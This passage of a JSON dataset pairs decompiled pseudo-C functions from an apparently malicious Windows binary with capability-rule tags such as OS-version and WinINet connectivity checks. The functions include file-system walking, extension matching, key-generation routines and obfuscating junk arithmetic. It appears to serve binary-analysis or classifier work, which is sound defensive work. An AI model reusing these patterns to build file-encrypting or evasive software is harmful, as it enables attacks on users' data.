            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00404539(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x42e998 == 0) {\n        fcn.004024e6(0x42e998);\n    }\n    (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 1, 1, 0x42e998);\n    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    return uVar1 & 0xffffff00 | uVar1 != 0xb7;\n}\n",
        "token_count": 132
    },
    "00404fbb": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00404fbb(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    piVar1 = fcn.00406338(8);\n    if (piVar1 != NULL) {\n        uVar2 = fcn.0040f418();\n        var_4h = 0;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = fcn.0040f43f(var_4h);\n                if (iVar3 != 0) {\n                    iVar3 = fcn.004063a5();\n                    piVar1[1] = iVar3;\n                    uVar4 = fcn.0040f598();\n                    if (arg_ch == 1) {\n                        arg_8h_00 = fcn.00406209(0x41262c, 4, 0x6863db8e, 0);\n                        fcn.00409428(arg_8h_00, uVar4);\n                    }\n                    else {\n                        uVar4 = fcn.00408e9a(uVar4);\n                        *(piVar1[1] + *piVar1 * 4) = uVar4;\n                    }\n                    *piVar1 = *piVar1 + 1;\n                }\n                var_4h = var_4h + 1;\n            } while (var_4h < uVar2);\n        }\n        if (*piVar1 == 0) {\n            fcn.00406445();\n            piVar1 = NULL;\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 398
    },
    "004057e3": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004057e3(uint32_t arg_8h, uint arg_ch)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int16_t *piVar7;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    if (arg_8h != 0) {\n        piVar5 = in_EAX + 8;\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x42e450, 0);\n            if (iVar3 == 0) break;\n            for (piVar4 = *piVar5 + piVar5[1] * 2; piVar1 = piVar4,  *piVar4 != 0x2e; piVar4 = piVar4 + -1) {\n            }\n            do {\n                piVar7 = piVar1;\n                piVar1 = piVar7 + -1;\n            } while (piVar7[-1] != 0x5c);\n            cVar2 = fcn.00404f83(piVar7);\n            if ((cVar2 == '\\0') && (var_4h = 0,  *0x42eac4 != 0)) {\n                do {\n                    cVar2 = fcn.00404f83(piVar4);\n                    if (cVar2 != '\\0') {\n                        if (*0x42eab0 == piVar7 - *piVar5 >> 1) {\n                            (*_sym.imp.SHLWAPI.dll_StrCmpNIW)(*piVar5, 0x42ead0, *0x42eab0);\n                        }\n                        fcn.004056db(piVar5 + -2);\n                        goto code_r0x00405898;\n                    }\n                    var_4h = var_4h + 1;\n                } while (var_4h < *0x42eac4);\n            }\n            fcn.00406445();\n            piVar5[-2] = 0;\n            piVar5[-1] = 0;\n            *piVar5 = 0;\n            piVar5[1] = 0;\ncode_r0x00405898:\n            var_ch = var_ch + 1;\n            piVar5 = piVar5 + 4;\n        } while (var_ch < arg_8h);\n    }\n    uVar6 = 0;\n    if (*0x42eac4 != 0xffffffff) {\n        do {\n            fcn.004057c3();\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < *0x42eac4 + 1);\n    }\n    return;\n}\n",
        "token_count": 646
    },
    "00405e30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405f51)\n\nuint32_t __cdecl fcn.00405e30(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t **ppuVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t *puVar9;\n    bool bVar10;\n    uint32_t uStack684;\n    uint32_t uStack680;\n    uint uStack676;\n    char cStack360;\n    int32_t iStack20;\n    \n    *0x414be4 = *0x4148e1 | 0x5f;\n    cVar2 = fcn.00409f19(arg_8h);\n    if (cVar2 == '\\0') {\n        uVar8 = *0x4148e3;\n        iVar7 = uStack680 + 0xfe;\n        uStack680 = 5;\n        do {\n            if ((iVar7 == uStack684 * 0xaa) ||\n               (*0x414be4 = uVar8,  iVar3 = fcn.00405cd4(*0x42e058, *0x42e05c),  iVar3 * 0xf7 - *0x414be4 == 0)) {\n                *0x414be4 = *0x4148e1 | 0x5f;\n            }\n            uStack680 = uStack680 + -1;\n        } while (uStack680 != 0);\n        return 0;\n    }\n    *0x414be4 = *0x414be4 - *0x4148e1;\n    uStack680 = 0;\n    fcn.00405cd4(0x1ba21b2, 0);\n    fcn.00405da9();\n    *0x414be4 = *0x4148e1 | 0x5f;\n    uStack684 = fcn.00406ed8();\n    uVar6 = *0x4148e1;\n    *0x414be4 = uVar6 | 0x5f;\n    uVar8 = *0x414be4;\n    if (((uStack684 < 0x70) || (uVar8 = *0x414be4 << (cStack360 * 'B' & 0x1fU),  iStack20 * 0xfa - uVar8 == 0)) &&\n       ((uStack684 | 0xd6) != 0x48)) {\n        iVar7 = uVar8 << (cStack360 * 'B' & 0x1fU);\n        if ((iVar7 + -0x85 == iStack20 + 0x5f) || (uVar6 <= iVar7 >> 0x1f)) {\n            *0x414be4 = *0x4148e3;\n        }\n        else {\n            *0x414be4 = iVar7 - uVar6;\n        }\n    }\n    fcn.00409d40();\n    uVar6 = *0x4148e1;\n    uVar8 = uVar6 | 0x5f;\n    *0x414be4 = uVar8;\n    for (puVar4 = *0x42f188; (puVar4 != NULL && (*puVar4 != uStack684)); puVar4 = puVar4[4]) {\n        fcn.00405cd4(*0x42dd78, *0x42dd7c);\n        *0x414be4 = uVar6;\n    }\n    if (puVar4 == NULL) {\n        *0x414be4 = uVar8 * uStack684;\n        puVar4 = fcn.00406338(8);\n        fcn.00405c92();\n        if (puVar4 == NULL) goto code_r0x004061ce;\n        fcn.00405c92();\n        puVar9 = *0x42f188;\n        *puVar4 = uStack684;\n        if (puVar9 == NULL) {\n            cVar2 = '\\x06';\n            do {\n                *0x414be4 = *0x414be4 << (cStack360 * 'B' & 0x1fU);\n                cVar2 = cVar2 + -1;\n            } while ('\\0' < cVar2);\n            *0x42f188 = puVar4;\n            fcn.00405c92();\n        }\n        else {\n            fcn.00405cd4(0, uStack676);\n            ppuVar5 = puVar9 + 4;\n            if (*ppuVar5 != NULL) {\n                do {\n                    *0x414be4 = *0x414be4 << (cStack360 * 'B' & 0x1fU);\n                    puVar9 = *ppuVar5;\n                    ppuVar5 = puVar9 + 4;\n                } while (*ppuVar5 != NULL);\n            }\n            puVar9[4] = puVar4;\n        }\n        uVar8 = fcn.00406338(0);\n        puVar4[2] = uVar8;\n        uVar1 = *0x4148e1;\n        uVar8 = *0x4148e1;\n        *0x414be4 = uVar8 | 0x5f;\n        if (puVar4[2] != 0) {\n            uStack684 = uStack684 & 0xffffff00 | *0x4148e1;\n            iVar7 = fcn.00405cd4(0x243aabf, 0);\n            iVar3 = fcn.00405cd4(0x3710ec, 0);\n            if ((iVar7 >> 0x1f < iVar3) && (iVar7 = fcn.00405cd4(0xb50fbf, 0),  iVar7 < uVar8)) {\n                *0x414be4 = *0x414be4 << (cStack360 * 'B' & 0x1fU);\n            }\n            else {\n                iVar7 = 2;\n                iVar3 = 0;\n                do {\n                    do {\n                        bVar10 = iVar7 != 0;\n                        iVar7 = iVar7 + -1;\n                        iVar3 = iVar3 + -1 + bVar10;\n                    } while (0 < iVar3);\n                } while ((-1 < iVar3) && (iVar7 != 0));\n            }\n            fcn.00406bdd(&arg_10h, 4, arg_8h, arg_ch, puVar4[2]);\n            uStack684 = uStack684 << (uVar1 - 0x28 & 0x1f);\n            *(arg_ch + puVar4[2]) = 0;\n        }\n    }\n    *0x414be4 = *0x4148e3;\n    if (arg_14h == '\\0') {\n        uStack680 = puVar4[2];\n    }\n    else {\n        if ((uStack684 & 0xffff) == (*0x414be4 | 0x18)) {\n            fcn.00405c2a(*0x4148e2);\n        }\n        if (puVar4[3] == 0) {\n            *0x414be4 = *0x414be4 | *0x4148e1;\n            uVar8 = fcn.00408e9a(puVar4[2]);\n            puVar4[3] = uVar8;\n        }\n        uStack680 = puVar4[3];\n    }\ncode_r0x004061ce:\n    *0x414be4 = *0x4148e1 | 0x5f;\n    fcn.00409dae();\n    return uStack680;\n}\n",
        "token_count": 1753
    },
    "00406606": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00406606(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    uVar1 = (*0x4141e4 + 0x6c) * param_1;\n    if ((*0x4141e4 == 0) || (uVar1 == 0xa0)) {\n        uVar1 = uVar1 & *0x4141e4;\n    }\n    else if (*0x4141e4 < 0) {\n        uVar1 = uVar1 - 0xc9;\n    }\n    else {\n        if (uVar1 == 0xffffffc5) {\n            return 0;\n        }\n        if (uVar1 == 0) {\n            return 0;\n        }\n    }\n    *0x4141e4 = 0;\n    iVar2 = 6;\n    do {\n        if (((*0x414bcc != 0) || (0x2d < *0x414bc8)) || (uVar1 * 0xba == 0)) goto code_r0x00406698;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    *0x4141e4 = uVar1 * 0xac;\n    if (((uVar1 < (*0x4141e4 & 0x6e)) || ((*0x4141e4 & 0xe2) == 0)) || (0xd < uVar1)) {\n        if (uVar1 < *0x4141e4 >> 0x1f) {\ncode_r0x00406698:\n            return uVar1 & 0xffff0000 | *0x414be0;\n        }\n    }\n    else {\n        *0x4141e4 = *0x4141e4 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 417
    },
    "00407020": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00407020(void)\n\n{\n    uint32_t *unaff_EDI;\n    uint32_t uStack4;\n    \n    if (unaff_EDI != NULL) {\n        fcn.00409d40();\n        uStack4 = 0;\n        if (*unaff_EDI != 0) {\n            do {\n                fcn.00408489();\n                uStack4 = uStack4 + 1;\n            } while (uStack4 < *unaff_EDI);\n        }\n        fcn.00409dae();\n        fcn.00409e17();\n        fcn.00406445();\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00407144": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407144(uint *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_2b8h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_10h = 0;\n    var_14h = fcn.0040a235();\n    var_8h = 0;\n    var_ch = 0;\n    do {\n        if (4 < var_ch) break;\n        fcn.0040a79c(arg_ch, arg_10h, 1);\n        fcn.0040a58d(arg_ch + -1);\n        fcn.0040a58d(arg_ch + -2);\n        uVar6 = 0;\n        fcn.0040a58d(0);\n        do {\n            uVar4 = fcn.0040a56d(var_14h, *(uVar6 + 0x414928));\n            *(&var_2b8h + uVar6) = uVar4;\n            uVar6 = uVar6 + 4;\n        } while (uVar6 < 0x29c);\n        iVar5 = 0;\n        var_8h = 0;\n        var_4h = 0;\n        if (arg_ch * 100 != 0) {\n            do {\n                iVar3 = var_14h;\n                uVar6 = 0;\n                if (iVar5 != 0) break;\n                var_10h = var_10h + 1;\n                if (var_4h != 0) {\n                    do {\n                        puVar2 = &var_2b8h + uVar6;\n                        puVar1 = uVar6 + 0x414928;\n                        uVar6 = uVar6 + 4;\n                        *puVar2 = (*puVar2 + 2) % *puVar1;\n                    } while (uVar6 < 0x29c);\n                }\n                uVar6 = 0;\n                do {\n                    if ((&var_2b8h)[uVar6] == 0) goto code_r0x0040725c;\n                    uVar6 = uVar6 + 1;\n                } while (uVar6 < 0xa7);\n                fcn.0040a56d(var_14h, 0x10001);\n                iVar5 = fcn.0040d32f(*(iVar3 + 4));\n                if ((iVar5 != 0) && (iVar5 = fcn.0040d8ee(*arg_8h),  iVar5 != 0)) {\n                    var_8h = 1;\n                    break;\n                }\ncode_r0x0040725c:\n                var_4h = var_4h + 1;\n                iVar5 = fcn.0040a421(arg_8h);\n            } while (var_4h < arg_ch * 100);\n        }\n        var_ch = var_ch + 1;\n    } while (var_8h == 0);\n    fcn.0040a262(&var_14h);\n    if (var_8h == 0) {\n        var_10h = -1;\n    }\n    return var_10h;\n}\n",
        "token_count": 785
    },
    "00407677": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407677(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint unaff_EDI;\n    \n    fcn.0040a32a(arg_10h, arg_14h);\n    fcn.0040a5cd(arg_8h, arg_ch, unaff_EDI);\n    if (arg_18h != 0) {\n        iVar1 = fcn.0040cf7b();\n        fcn.0040a362(arg_18h, iVar1 + 7U >> 3);\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00408cee": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408cee(uint lpWideCharStr, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    if (in_EAX == 0) {\n        in_EAX = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpWideCharStr);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0x4e3, 0x200, lpWideCharStr, in_EAX);\n    if (arg_ch != 0) {\n        if (arg_ch < uVar1) {\n            uVar1 = 0;\n        }\n        *(uVar1 + unaff_ESI) = 0;\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00408d2d": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408d2d(uint CodePage, uint lpString, uint32_t arg_10h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    if (in_EAX == 0) {\n        in_EAX = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(CodePage, 0, lpString, in_EAX);\n    if (arg_10h != 0) {\n        if (arg_10h < uVar1) {\n            uVar1 = 0;\n        }\n        *(unaff_ESI + uVar1 * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "004091a1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004091a1(uint32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    uVar4 = 0;\n    if ((arg_ch != '\\0') && (1 < arg_8h)) {\n        cVar1 = fcn.00409ec6();\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.00409069(arg_ch, &var_4h);\n            if (iVar2 != 0) {\n                if (arg_8h != 1) {\n                    do {\n                        iVar3 = fcn.00408a11();\n                        *(in_EAX + uVar4 * 2) = *(iVar2 + iVar3 * 2);\n                        uVar4 = uVar4 + 1;\n                    } while (uVar4 < arg_8h - 1);\n                }\n                *(in_EAX + -2 + arg_8h * 2) = 0;\n                fcn.00406445();\n                uVar4 = 1;\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 281
    },
    "00409681": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409681(int32_t arg_8h)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t unaff_EDI;\n    uint phProv;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    cVar1 = fcn.00409e9f(arg_8h);\n    if (cVar1 != '\\0') {\n        uVar4 = 0;\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(&phProv, 0, 0, 1, 0xf0000040);\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_CryptGenRandom)(phProv);\n            _auStack8 = _auStack8 & 0xffffff | (iVar3 != 0) << 0x18;\n            (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(phProv, 0);\n            if (var_1h != '\\0') {\n                return;\n            }\n        }\n        if (unaff_EDI != 0) {\n            do {\n                uVar2 = fcn.00408a11();\n                *(uVar4 + arg_8h) = uVar2;\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < unaff_EDI);\n        }\n    }\n    return;\n}\n",
        "token_count": 355
    },
    "00409c96": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00409c96(void)\n\n{\n    int16_t *in_EAX;\n    \n    if (((in_EAX != NULL) && (*in_EAX == 0x2e)) && ((in_EAX[1] == 0 || ((in_EAX[1] == 0x2e && (in_EAX[2] == 0)))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 95
    },
    "0040a362": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0040a362(int32_t param_1, int32_t param_2)\n\n{\n    uint arg_ch;\n    uint arg_8h;\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    arg_ch = in_EAX[1];\n    arg_8h = *in_EAX;\n    iVar1 = fcn.0040cf7b();\n    uVar2 = iVar1 + 7U >> 3;\n    if (uVar2 == 0) {\n        uVar2 = 1;\n    }\n    if ((param_1 != 0) && (param_2 != 0)) {\n        uVar2 = fcn.0040d3ac(arg_8h, arg_ch, param_1, param_2);\n    }\n    return uVar2;\n}\n",
        "token_count": 189
    },
    "0040a495": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040a495(uint *param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_1[1];\n    if ((iVar2 == 0) || (param_2 == 0)) {\n        fcn.0040a29a(0);\n    }\n    else {\n        fcn.0040a29a(iVar2 + 1);\n        iVar1 = fcn.0040d219(*param_1, param_2);\n        if (iVar1 == 0) {\n            iVar2 = fcn.0040cf67(*in_EAX);\n            in_EAX[1] = iVar2;\n        }\n        else {\n            *(*in_EAX + iVar2 * 4) = iVar1;\n            in_EAX[1] = iVar2 + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 211
    },
    "0040ab87": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nint32_t __cdecl fcn.0040ab87(double *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    float fVar3;\n    bool bVar4;\n    uint8_t uVar5;\n    uint8_t *in_EAX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint8_t *puVar8;\n    int32_t *unaff_EDI;\n    bool bVar9;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    float10 extraout_ST0_01;\n    float10 extraout_ST1;\n    float10 extraout_ST1_00;\n    float10 fVar10;\n    int64_t iVar11;\n    uint var_18h;\n    int32_t var_14h;\n    double *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    var_8h = 0;\n    uVar5 = *in_EAX;\n    if (uVar5 == 0) {\n        return 0;\n    }\n    do {\n        iVar6 = (*_sym.imp.ntdll.dll_isspace)(uVar5);\n        if (iVar6 == 0) break;\n        in_EAX = in_EAX + 1;\n        uVar5 = *in_EAX;\n        var_8h = var_8h + 1;\n    } while (uVar5 != 0);\n    uVar5 = *in_EAX;\n    if (uVar5 == 0) {\n        return var_8h;\n    }\n    var_ch = 0;\n    // switch table (10 cases) at 0x40b06b\n    switch(*unaff_EDI) {\n    case 1:\n        if (arg_8h != NULL) {\n            *arg_8h = uVar5;\n        }\n        goto code_r0x0040abe2;\n    case 2:\n        if (arg_8h != NULL) {\n            *arg_8h = uVar5;\n        }\ncode_r0x0040abe2:\n        var_8h = 1;\n        goto code_r0x0040b05b;\n    case 3:\n        var_ch = 0;\n        iVar6 = unaff_EDI[2];\n        while (((iVar6 != 0 && (*in_EAX != 0)) && (iVar6 = (*_sym.imp.ntdll.dll_isspace)(*in_EAX),  iVar6 == 0))) {\n            if (arg_8h != NULL) {\n                *(var_ch + arg_8h) = *in_EAX;\n            }\n            if (0 < unaff_EDI[2]) {\n                unaff_EDI[2] = unaff_EDI[2] + -1;\n            }\n            var_ch = var_ch + 1;\n            in_EAX = in_EAX + 1;\n            iVar6 = unaff_EDI[2];\n        }\n        if (arg_8h != NULL) {\n            *(var_ch + arg_8h) = 0;\n        }\n        goto code_r0x0040ac44;\n    case 4:\n        var_ch = 0;\n        iVar6 = unaff_EDI[2];\n        while (((iVar6 != 0 && (*in_EAX != 0)) && (iVar6 = (*_sym.imp.ntdll.dll_isspace)(*in_EAX),  iVar6 == 0))) {\n            if (arg_8h != NULL) {\n                fcn.00408e40(in_EAX, 1, arg_8h + var_ch * 2);\n            }\n            if (0 < unaff_EDI[2]) {\n                unaff_EDI[2] = unaff_EDI[2] + -1;\n            }\n            var_ch = var_ch + 1;\n            in_EAX = in_EAX + 1;\n            iVar6 = unaff_EDI[2];\n        }\n        if (arg_8h != NULL) {\n            *(arg_8h + var_ch * 2) = 0;\n        }\ncode_r0x0040ac44:\n        var_8h = var_8h + var_ch;\ncode_r0x0040ac49:\n        if (var_ch == 0) {\n            return var_8h;\n        }\n        goto code_r0x0040b05b;\n    case 5:\n    case 6:\n        break;\n    case 7:\n        var_ch = 0x10;\n        break;\n    case 8:\n        var_ch = 8;\n        break;\n    case 9:\n        if (unaff_EDI[4] == 0) {\n            return var_8h;\n        }\n        var_ch = 0;\n        var_10h = arg_8h;\n        cVar1 = *(unaff_EDI + 3);\n        while (((unaff_EDI[2] != 0 && (uVar5 = *in_EAX,  uVar5 != 0)) &&\n               (in_EAX = in_EAX + 1,  -(cVar1 != '\\0') != -((1 << (uVar5 & 7) & *((uVar5 >> 3) + unaff_EDI[4])) != 0))))\n        {\n            var_8h = var_8h + 1;\n            *var_10h = uVar5;\n            if (0 < unaff_EDI[2]) {\n                unaff_EDI[2] = unaff_EDI[2] + -1;\n            }\n            var_ch = var_ch + 1;\n            var_10h = var_10h + 1;\n        }\n        if (var_10h != NULL) {\n            *var_10h = 0;\n        }\n        fcn.00406445();\n        goto code_r0x0040ac49;\n    case 10:\n        fVar10 = 0;\n        if ((uVar5 == 0x2d) || (uVar5 == 0x2b)) {\n            in_EAX = in_EAX + 1;\n            var_8h = var_8h + 1;\n            if (0 < unaff_EDI[2]) {\n                unaff_EDI[2] = unaff_EDI[2] + -1;\n            }\n        }\n        if (*in_EAX != 0x2e) {\n            while (((unaff_EDI[2] != 0 && (uVar5 = *in_EAX,  uVar5 != 0)) &&\n                   (iVar6 = fcn.0040ab36(uVar5),  fVar10 = extraout_ST1,  iVar6 != 0))) {\n                in_EAX = in_EAX + 1;\n                var_8h = var_8h + -1;\n                fVar10 = extraout_ST1 * extraout_ST0 + uVar5 + -0x30;\n                if (0 < unaff_EDI[2]) {\n                    unaff_EDI[2] = unaff_EDI[2] + -1;\n                }\n            }\n        }\n        iVar6 = unaff_EDI[2];\n        if ((iVar6 != 0) && (*in_EAX == 0x2e)) {\n            while( true ) {\n                in_EAX = in_EAX + 1;\n                var_8h = var_8h + -1;\n                if (0 < iVar6) {\n                    unaff_EDI[2] = iVar6 + -1;\n                }\n                if (((unaff_EDI[2] == 0) || (uVar5 = *in_EAX,  uVar5 == 0)) ||\n                   (iVar6 = fcn.0040ab36(uVar5),  iVar6 == 0)) break;\n                iVar6 = unaff_EDI[2];\n                fVar10 = (uVar5 + -0x30) * (extraout_ST0_00 / extraout_ST1_00) + fVar10;\n            }\n        }\n        iVar6 = unaff_EDI[2];\n        if ((iVar6 != 0) && ((*in_EAX == 0x65 || (*in_EAX == 0x45)))) {\n            var_ch = 0;\n            puVar8 = in_EAX + 1;\n            bVar9 = false;\n            if (0 < iVar6) {\n                unaff_EDI[2] = iVar6 + -1;\n            }\n            iVar6 = unaff_EDI[2];\n            iVar7 = var_8h + -1;\n            if ((iVar6 != 0) && ((uVar5 = *puVar8,  uVar5 == 0x2d || (uVar5 == 0x2b)))) {\n                bVar9 = uVar5 == 0x2d;\n                puVar8 = in_EAX + 2;\n                iVar7 = var_8h + -2;\n                if (0 < iVar6) {\n                    unaff_EDI[2] = iVar6 + -1;\n                }\n            }\n            while (((var_8h = iVar7,  unaff_EDI[2] != 0 && (uVar5 = *puVar8,  uVar5 != 0)) &&\n                   (iVar6 = fcn.0040ab36(uVar5),  fVar10 = extraout_ST0_01,  iVar6 != 0))) {\n                var_ch = var_ch * 10 + -0x30 + uVar5;\n                puVar8 = puVar8 + 1;\n                iVar7 = var_8h + -1;\n                if (0 < unaff_EDI[2]) {\n                    unaff_EDI[2] = unaff_EDI[2] + -1;\n                }\n            }\n            fVar3 = *0x4128d0;\n            if (bVar9) {\n                fVar3 = *0x4128d4;\n            }\n            for (; var_ch != 0; var_ch = var_ch / 2) {\n                if ((var_ch & 1) != 0) {\n                    fVar10 = fVar10 * fVar3;\n                }\n                fVar3 = fVar3 * fVar3;\n            }\n        }\n        if (arg_8h != NULL) {\n            if (((unaff_EDI[1] & 0x10U) == 0) && ((unaff_EDI[1] & 1U) == 0)) {\n                *arg_8h = fVar10;\n            }\n            else {\n                *arg_8h = fVar10;\n            }\n        }\n        goto code_r0x0040b05b;\n    default:\n        return var_8h;\n    }\n    iVar11 = 0;\n    bVar9 = false;\n    